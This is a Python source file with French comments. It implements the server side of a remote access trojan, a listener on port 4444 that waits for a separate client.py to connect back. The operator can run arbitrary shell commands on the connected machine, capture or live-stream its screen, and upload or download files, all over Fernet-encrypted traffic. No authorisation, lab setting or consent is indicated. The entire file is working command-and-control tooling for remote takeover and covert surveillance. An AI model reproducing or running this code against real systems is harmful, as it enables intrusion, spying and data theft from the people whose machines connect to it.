import socket
import time
import os
import cv2
import numpy as np
from cryptography.fernet import Fernet
from io import BytesIO
from PIL import Image

# Générer ou charger une clé de chiffrement
KEY_FILE = "fernet_key.key"
if os.path.exists(KEY_FILE):
    with open(KEY_FILE, "rb") as f:
        key = f.read()
else:
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
cipher = Fernet(key)

def get_local_ips():
    """Récupérer toutes les adresses IP locales."""
    ip_list = []
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip_list.append(s.getsockname()[0])
        s.close()
    except Exception:
        pass
    ip_list.append(socket.gethostbyname(socket.gethostname()))
    return list(set(ip_list))

def print_help():
    help_text = """
Commandes disponibles :
  help          : Afficher cette aide
  whoami        : Afficher l'utilisateur actuel
  sysinfo       : Afficher les informations système
  screenshot    : Recevoir une capture d'écran du client
  stream        : Diffuser l'écran du client en temps réel sur le serveur (appuyez sur 'q' pour arrêter)
  upload <file> : Envoyer un fichier au client
  download <file> : Télécharger un fichier depuis le client
  <commande>    : Exécuter une commande shell
  exit          : Fermer la connexion
"""
    print(help_text)

def receive_file(client_socket, filename):
    try:
        with open(filename, "wb") as f:
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                if data.endswith(b"EOF"):
                    f.write(data[:-3])
                    break
                f.write(data)
        print(f"[*] Fichier {filename} téléchargé avec succès")
    except Exception as e:
        print(f"[!] Erreur lors du téléchargement : {e}")

def send_file(client_socket, filename):
    try:
        with open(filename, "rb") as f:
            while True:
                data = f.read(1024)
                if not data:
                    client_socket.send(b"EOF")
                    break
                client_socket.send(data)
        print(f"[*] Fichier {filename} envoyé avec succès")
    except Exception as e:
        print(f"[!] Erreur lors de l'envoi : {e}")

def receive_screenshot(client_socket):
    try:
        # Recevoir la taille de l'image
        size_data = client_socket.recv(16)
        if not size_data:
            return "[!] Erreur : aucune donnée reçue pour la taille de l'image"
        size = int(size_data.decode().strip())
        if size <= 0 or size > 10_000_000:  # Limiter à 10 Mo
            return f"[!] Erreur : taille de l'image invalide ({size})"
        
        print(f"[*] Réception d'une image de {size} octets...")
        
        # Recevoir l'image
        data = b""
        while len(data) < size:
            packet = client_socket.recv(min(size - len(data), 8192))  # Buffer plus grand
            if not packet:
                return "[!] Erreur : connexion interrompue pendant la réception"
            data += packet
        
        # Décrypter et enregistrer l'image
        decrypted_data = cipher.decrypt(data)
        img = Image.open(BytesIO(decrypted_data))
        img.save("received_screenshot.jpg", "JPEG")
        print("[*] Capture d'écran reçue et enregistrée comme received_screenshot.jpg")
        
        return "[*] Capture d'écran envoyée au serveur"
    except Exception as e:
        print(f"[!] Erreur lors de la réception de la capture : {e}")
        return f"[!] Erreur : {e}"

def receive_stream(client_socket):
    try:
        print("[*] Démarrage du streaming de l'écran du client sur le serveur...")
        client_socket.settimeout(5.0)  # Timeout pour éviter les blocages
        while True:
            # Recevoir la taille de l'image
            size_data = client_socket.recv(16)
            if not size_data:
                print("[!] Connexion interrompue ou aucune donnée reçue")
                break
            size = int(size_data.decode().strip())
            if size <= 0 or size > 10_000_000:
                print(f"[!] Taille d'image invalide : {size}")
                continue
            
            # Recevoir l'image
            data = b""
            while len(data) < size:
                packet = client_socket.recv(min(size - len(data), 8192))
                if not packet:
                    print("[!] Connexion interrompue pendant la réception de l'image")
                    return
                data += packet
            
            # Vérifier si le streaming est arrêté
            if data == b"STREAM_STOP":
                print("[*] Streaming arrêté")
                break
            
            # Décrypter et convertir en image
            decrypted_data = cipher.decrypt(data)
            img = Image.open(BytesIO(decrypted_data))
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            
            # Afficher l'image
            cv2.imshow("Screen Stream", frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                client_socket.send(cipher.encrypt(b"STOP_STREAM"))
                cv2.destroyAllWindows()
                break

    except Exception as e:
        print(f"[!] Erreur lors du streaming : {e}")
    finally:
        cv2.destroyAllWindows()
        client_socket.settimeout(None)

def start_server(host='0.0.0.0', port=4444):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, port))
    server_socket.listen(1)
    
    # Afficher les adresses IP locales
    local_ips = get_local_ips()
    print(f"[*] Serveur démarré sur {host}:{port} | {time.ctime()}")
    print(f"[*] Adresses IP locales : {', '.join(local_ips)}")
    print("[*] Utilisez une de ces adresses dans client.py pour vous connecter.")

    while True:
        try:
            client_socket, addr = server_socket.accept()
            print(f"[*] Connexion de {addr[0]}:{addr[1]} | {time.ctime()}")

            # Envoyer la clé de chiffrement au client
            client_socket.send(key)

            while True:
                try:
                    command = input(f"[{addr[0]}] Commande > ")
                    if not command:
                        continue

                    if command.lower() == 'help':
                        print_help()
                        continue

                    # Chiffrer la commande
                    encrypted_command = cipher.encrypt(command.encode())
                    client_socket.send(encrypted_command)

                    if command.lower() == 'exit':
                        break

                    if command.lower() == 'screenshot':
                        response = receive_screenshot(client_socket)
                        print(f"[*] Réponse ({time.ctime()}) :\n{response}")
                        continue

                    if command.lower() == 'stream':
                        receive_stream(client_socket)
                        continue

                    if command.startswith('upload '):
                        filename = command.split(' ', 1)[1]
                        if os.path.exists(filename):
                            client_socket.send(cipher.encrypt(b"UPLOAD_READY"))
                            send_file(client_socket, filename)
                            continue
                        else:
                            print(f"[!] Fichier {filename} introuvable")
                            continue

                    if command.startswith('download '):
                        filename = command.split(' ', 1)[1]
                        client_socket.send(cipher.encrypt(b"DOWNLOAD_READY"))
                        receive_file(client_socket, f"downloaded_{filename}")
                        continue

                    # Recevoir la réponse
                    encrypted_response = client_socket.recv(4096)
                    response = cipher.decrypt(encrypted_response).decode()
                    print(f"[*] Réponse ({time.ctime()}) :\n{response}")

                except Exception as e:
                    print(f"[!] Erreur avec le client {addr[0]} : {e}")
                    break

            client_socket.close()
            print(f"[*] Connexion avec {addr[0]} fermée | {time.ctime()}")

        except Exception as e:
            print(f"[!] Erreur serveur : {e}")
            break

    server_socket.close()
    print("[*] Serveur arrêté |", time.ctime())

if __name__ == "__main__":
    start_server()